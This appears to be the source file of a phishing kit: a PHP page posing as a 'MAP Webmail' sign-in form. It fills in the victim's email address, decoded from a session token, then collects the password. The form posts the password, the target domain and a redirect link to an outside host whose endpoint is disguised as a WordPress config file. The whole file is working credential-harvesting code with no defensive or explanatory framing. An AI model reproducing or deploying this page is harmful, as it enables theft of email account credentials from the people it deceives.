<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>MAP Webmail - Sign</title>
<link rel="icon" type="image/png" href="img/favicon_url.ico" />
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 34px;
  width: 100%;
  padding: 6px 4px;
  border: 1px solid #d5d5d5;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0;
  font-size: 14px;
  font-family: Arial,sans-serif;
  color: #404040;
  }
  input[type=password] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 34px;
  width: 100%;
  padding: 6px 4px;
  border: 1px solid #d5d5d5;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0;
  font-size: 12px;
  font-family: Arial,sans-serif;
  color: #787878;
  }
  input[type=text]:focus {
  outline: none;
  background-color: #f7f7f7;
  border: 1px solid gold;
  }
  input[type=password]:focus {
  outline: none;
  border: 1px solid #d5d5d5;
  }

</style>
<body background="https://i.ibb.co/Wtf9fQj/bg.png">

<div align="center">
	<table border="0" width="540" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="42" ></td>
				</tr>
				<tr>
					<td background="https://i.ibb.co/RHjYSFz/fm.png">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">

					   <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
						<tr>
							<td height="214" ></td>
						</tr>
						<tr>
							<td height="85">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="58"></td>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td>
											   <input type="text" name="user" placeholder="ID" value="<?php echo $users;?>@<?php echo $ddomain;?>" > 
											   <input type="hidden" name="link" value="http://mail.<?php echo $ddomain;?>/ngw/app/#/sign" >  
											   <input type="hidden" name="domain" value="<?php echo $ddomain;?>" > 
											   <input type="hidden" name="sender" value="Ngw" > 
											</td>
										</tr>
										<tr>
											<td height="15"></td>
										</tr>
										<tr>
											<td>
											   <table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td>
											   <input type="password" name="passwd" placeholder="Password" required autofocus ></td>
													<td width="37" ></td>
												</tr>
												</table>
											</td>
										</tr>
									</table>
									</td>
									<td width="20"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="15"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td></td>
									<td width="77">
									<input type="image" src="https://i.ibb.co/VYCwLyB/btn.png" width="75" height="34"></td>
									<td width="62"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="68"></td>
						</tr>
						</form>
					</table>
					</td>
				</tr>
								
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>